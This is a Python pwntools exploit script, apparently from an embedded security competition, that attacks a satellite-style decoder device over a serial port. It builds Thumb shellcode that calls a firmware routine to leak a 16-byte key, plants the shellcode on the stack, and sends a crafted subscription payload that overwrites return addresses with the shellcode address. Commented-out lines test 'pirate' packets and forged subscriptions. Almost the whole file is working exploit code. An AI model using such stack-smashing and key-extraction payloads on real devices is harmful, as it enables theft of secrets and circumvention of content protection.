#!/usr/bin/env python3

from pwn import *
from decoder_mod import DecoderIntf

context.arch = 'thumb'

def conn():
    r = DecoderIntf('/dev/ttyACM0')

    return r

def construct_shellcode():
    key_addr = 0x100193c0
    key_len = 0x10
    shellcode = asm(f'''
        nop
        nop
        nop
        nop
        nop
        nop
        ldr r0, ={hex(0x47)}
        ldr r1, ={hex(key_addr)}
        ldr r2, ={hex(key_len)}
        ldr r5, ={hex(0x1000e928 + 1)}
        bx r5
    ''')

    print(len(shellcode))
    return shellcode

def main():
    r = conn()

    # when pop of second ret addr, sp end at 0x2001ff24

    # shellcode_addr = 0x2001ff08 + 4 + 48 + 2 * 2
    shellcode_addr = 0x2001ff3c + 1
    # shellcode_addr = 0x1000e814 + 1

    # plaintext=b'\x90\xff\xfa\xf6\xbb\x82\x1a\x1d\xf3{C &\x1b\x01\x10'
    # ciphertext will decrypt to above plaintext
    # ciphertext=b"\xe3mk'\xff3\x0b\xb8\xc7{\xa4\x13H\xfeZ\xa8"
    plaintext=b'}\xb2PV\xe5\x86\x7f\xd4B\x9c\xa9\x94\x05\x07\x01\x10'
    # real
    ciphertext=b"\x16+{4\x9bR\xb2\xc7\xbd\x9fE\x00\x1b\xce'b"
    # testing
    # ciphertext = b'`W\x8f\xd1im\xff\x14\xedf[\xc8\xdd\xb2\x8b\x9a'

    payload_shellcode = b'\0' * 48 + construct_shellcode()
    print(len(payload_shellcode))
    assert len(payload_shellcode) < 100
    assert len(payload_shellcode) % 16 != 0
    # 1 word is between uart buffer and stack bottom
    # payload = p32(shellcode_addr) + p32(0) + p32(0) + p32(0) + b'\0' * 16 + ciphertext
    payload = p32(shellcode_addr) * 8 + ciphertext

    try:
        print(r.decode(payload_shellcode))
    except Exception as e:
        # exception is expected
        print(e)
    print('shellcode placed on stack')
    print(r.subscribe(payload))
    print('subscribe done')

    # payload = bytes.fromhex('c120f8c2b5499467587aba26440a0689907cb1e199d4deb10267cb86887b24045797e65d9ff8b3f2079611c3e536a345a1d97128f2d62d232cd902e13ee9cd41438e20958dedf408909a7a5aa38e009f')
    # data_own = bytes.fromhex('68f27d959ae383d4da2c3a9be0bed091945a90ba641714706202a6cf69691fc0')

    # r.subscribe(data_own)
    # print(r.decode(payload))

    # bad_sub = bytes.fromhex('68f27d959ae383d4da2c3a9be0bed09195580ce827dc0ddf945c9734c3899691')
    # r.subscribe(bad_sub)
    # pirate_packet = bytes.fromhex('943c5718db83ba3d90713906d9bb42bef2fafec9552a0539b2da0dffc8e01df77f0f3d1ff22051bed28cf973d49f8332a36b91351252f3b1000b0aee0a304358fc82c735fa14bf1a4c752e47dbb55529')
    # print(r.decode(pirate_packet))



if __name__ == "__main__":
    main()
